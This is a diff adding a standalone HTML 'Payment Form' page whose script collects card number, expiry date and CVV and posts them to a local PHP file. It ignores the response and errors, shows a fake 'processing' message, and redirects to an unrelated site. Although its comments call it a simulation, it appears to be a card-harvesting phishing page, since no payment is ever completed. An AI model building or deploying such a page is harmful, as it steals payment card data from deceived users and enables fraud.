@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Form</title>
+    <link rel="stylesheet" href="style.css"> <!-- Link to separate CSS file -->
+</head>
+<body>
+
+    <div class="overlay" id="overlay"></div> <!-- Overlay Element -->
+
+    <div class="form-container">
+        <div class="payment-form">
+            <h1>Payment Information</h1>
+
+            <form id="paymentForm">
+                <div class="input-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" maxlength="19" placeholder="Card Number" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="expiryDate">Expiration Date (MM/YY)</label>
+                    <input type="text" id="expiryDate" maxlength="5" placeholder="MM/YY" required oninput="formatExpiryDate(this)">
+                </div>
+
+                <div class="input-group">
+                    <label for="securityCode">CVV/CVC</label>
+                    <input type="text" id="securityCode" maxlength="3" placeholder="CVV/CVC" required>
+                </div>
+
+                <button type="submit" id="submitButton">Submit Payment</button>
+            </form>
+
+            <div id="statusMessage" class="status-message"></div>
+        </div>
+    </div>
+
+    <script>
+        // Format the expiration date to add '/' between MM and YY
+        function formatExpiryDate(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length <= 2) {
+                input.value = value; // Show only month when entered
+            } else {
+                input.value = value.slice(0, 2) + '/' + value.slice(2, 4); // Add '/' between month and year
+            }
+        }
+
+        // Format the card number into 4-digit groups
+        document.getElementById('cardNumber').addEventListener('input', function(event) {
+            let value = this.value.replace(/\D/g, ''); // Take only numbers
+
+            // Split into 4-digit groups and add space between them
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i += 4) {
+                formattedValue += value.slice(i, i + 4) + ' '; // Add space after every 4 digits
+            }
+
+            // Remove the last space
+            this.value = formattedValue.trim();
+        });
+
+        // Form submission
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent the form from being immediately submitted
+
+            // Disable the button to prevent multiple submissions
+            var submitButton = document.getElementById('submitButton');
+            submitButton.disabled = true; // Disable the button
+
+            var cardNumber = document.getElementById('cardNumber').value;
+            var expiryDate = document.getElementById('expiryDate').value;
+            var securityCode = document.getElementById('securityCode').value;
+
+            // Check the card number format, only numbers, and 4 groups of 4 digits
+            if (!/^\d{4} \d{4} \d{4} \d{4}$/.test(cardNumber)) {
+                alert('Invalid card number! Please enter only numbers and separate them into 4-digit groups.');
+                submitButton.disabled = false; // Enable the button if there's an error
+                return; // Do not submit the form if there's an error
+            }
+
+            // Status message
+            var statusMessage = document.getElementById('statusMessage');
+            var overlay = document.getElementById('overlay'); // Select overlay element
+
+            // Show overlay
+            overlay.style.display = 'block'; 
+
+            // Show status message
+            statusMessage.style.display = 'block';
+            statusMessage.textContent = 'Processing your payment...';
+            statusMessage.classList.remove('success', 'error');
+
+            // Update message after 3 seconds
+            setTimeout(function() {
+                statusMessage.textContent = 'You are being redirected...'; // New message
+            }, 3000); // Wait for 3 seconds
+
+            // Payment simulation: 2 dollars payment
+            var paymentAmount = 2; // 2 dollars
+
+            // Create JSON data to send
+            var formData = {
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                securityCode: securityCode,
+                amount: paymentAmount
+            };
+
+            // Send POST request to PHP file (simulation)
+            fetch('as.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Even if the transaction is successful, only the waiting and redirection will be valid.
+            })
+            .catch(error => {
+                // No error message added, just redirection happens.
+            });
+
+            // Redirect after 4 seconds
+            setTimeout(function() {
+                window.location.href = 'http://www.examplewebsite.com'; // Redirect URL
+            }, 4000); // Redirect after 4 seconds
+        });
+    </script>
+
+</body>
+</html>
